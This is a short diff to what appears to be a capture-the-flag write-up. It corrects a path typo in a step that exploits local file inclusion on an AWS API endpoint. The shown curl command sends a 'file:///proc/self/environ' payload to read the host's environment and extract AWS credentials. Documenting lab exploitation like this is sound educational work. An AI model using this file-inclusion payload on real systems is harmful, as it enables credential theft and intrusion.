@@ -72,7 +72,7 @@ Then, we found that it can take a file prefix in the JSON:
 This is local file inclusion!
 ![web4](img/web4.png)
 
-After we determined we had LFI on this endpoint, we grabbed the `/prof/self/environ` file in order to pull AWS credentials from the host (the sed line is some parsing to make this look nicer):
+After we determined we had LFI on this endpoint, we grabbed the `/proc/self/environ` file in order to pull AWS credentials from the host (the sed line is some parsing to make this look nicer):
 ```
 $ curl -H "authorizationToken:flag-{gtkO4f4NOrJsRRNZWxiTbL6LLUs5Ir8g}" -d "{\"codeFile\": \"file:///proc/self/environ\"}"  https://jg0rh6th8e.execute-api.ap-south-1.amazonaws.com/test/share | sed 's/\\x00/\n/g'
 
